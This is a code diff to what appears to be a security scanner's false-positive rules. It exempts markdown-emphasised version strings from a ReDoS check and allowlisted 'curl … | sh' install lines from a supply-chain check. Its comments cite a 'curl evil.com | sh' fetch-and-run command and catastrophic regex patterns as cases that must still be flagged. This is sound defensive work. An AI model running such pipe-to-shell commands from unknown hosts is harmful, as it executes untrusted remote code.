@@ -1216,6 +1216,43 @@ def _is_versionish_regex_quantifier(match: str) -> bool:
     return "(\\.\\d+)+" in match or "(?:\\.\\d+)+" in match
 
 
+# Issue #74 — a REGEX_DOS match that is actually MARKDOWN EMPHASIS around a
+# literal version string, e.g. the README cell ``*(v2.23.0+)*``. The catalog
+# pattern greedily grabs the closing emphasis ``*`` and reads ``(v2.23.0+)*``
+# as a quantified group — but the surrounding ``*…*`` are markdown italic
+# delimiters and the parenthesised content is a printed version number, not a
+# regex. A real catastrophic pattern (``(a+)+`` / ``(\d+)*``) carries no
+# literal ``N.N`` version, so requiring an embedded dotted version literal
+# keeps this FN-safe: a genuine ReDoS regex stays visible.
+_MD_EMPHASIS_VERSION_LITERAL_RE: Final[re.Pattern[str]] = re.compile(r"\d+\.\d+(?:\.\d+)*")
+
+
+def _is_markdown_emphasis_version_quantifier(line: str, match: str) -> bool:
+    r"""True iff a REGEX_DOS ``match`` is a markdown-emphasis-wrapped version
+    string (``*(v2.23.0+)*``), not a real regex.
+
+    ALL of the following must hold (each is a separate FN guard):
+
+      1. ``match`` ends with a markdown emphasis delimiter (``*`` or ``_``)
+         that the greedy catalog quantifier captured, AND
+      2. the character immediately before ``match`` on ``line`` is the SAME
+         delimiter (the emphasis OPENER) — so the match is genuinely bracketed
+         by ``*…*`` / ``_…_``, AND
+      3. ``match`` embeds a dotted numeric VERSION literal (``2.23.0``) — a
+         catastrophic regex never contains a printed version number.
+
+    A real nested-quantifier ReDoS pattern (``(a+)+``, ``(\d+)*``) fails (2)
+    and/or (3) and stays visible.
+    """
+    if not match or match[-1] not in ("*", "_"):
+        return False
+    closer = match[-1]
+    idx = line.find(match)
+    if idx <= 0 or line[idx - 1] != closer:
+        return False
+    return bool(_MD_EMPHASIS_VERSION_LITERAL_RE.search(match))
+
+
 # SHELL_EXEC call-symbol names. A bare mention (not immediately followed by
 # ``(``) is a documentation reference to the API, not an invocation.
 _SHELL_EXEC_SYMBOL_RE: Final[re.Pattern[str]] = re.compile(
@@ -1576,7 +1613,14 @@ def _certain_benign_literal(
 
     # (9g) r07 FP iter (2026-05-28) — REGEX_DOS on the anchored-iteration
     #     semver idiom ``(\.\d+)+`` is linear-time, not catastrophic.
-    if rule_id == "REGEX_DOS" and _is_versionish_regex_quantifier(match):
+    #     Issue #74 — ALSO a REGEX_DOS match that is markdown EMPHASIS around a
+    #     printed version string (``*(v2.23.0+)*`` in a README table cell): the
+    #     ``*…*`` are italic delimiters, not regex quantifiers. The helper
+    #     requires both the emphasis-delimiter wrap AND an embedded dotted
+    #     version literal, so a genuine ``(a+)+`` / ``(\d+)*`` stays visible.
+    if rule_id == "REGEX_DOS" and (
+        _is_versionish_regex_quantifier(match) or _is_markdown_emphasis_version_quantifier(line, match)
+    ):
         return True
 
     # (9h) r08 FP iter (2026-05-28) — SHELL_EXEC on a bare API-symbol
@@ -1594,7 +1638,13 @@ def _certain_benign_literal(
     # (9i) r01 FP iter (2026-05-28) — SUPPLY_CHAIN ESM ``import … from
     #     'https://<known-cdn>/…'`` is a pinned dependency from a reputable
     #     CDN mirror, not dependency-confusion / dynamic remote-code load.
-    if rule_id == "SUPPLY_CHAIN" and _is_known_cdn_import(line, match):
+    #     Issue #74 — ALSO the canonical ``curl <official-host>… | sh`` install
+    #     ritual a README documents (``curl -LsSf https://astral.sh/uv/install.sh
+    #     | sh``). ``_is_official_install_pipe`` requires the host be in the
+    #     official-install allowlist, so a ``curl evil.com | sh`` from an
+    #     unknown host still fires (verified two-sided). Same host allowlist
+    #     that already clears the CMD_INJECTION ``| sh`` match on these lines.
+    if rule_id == "SUPPLY_CHAIN" and (_is_known_cdn_import(line, match) or _is_official_install_pipe(line)):
         return True
 
     # (9j) r08 FP iter (2026-05-28) — INTENT_DESTRUCTIVE_INTENT ``remove
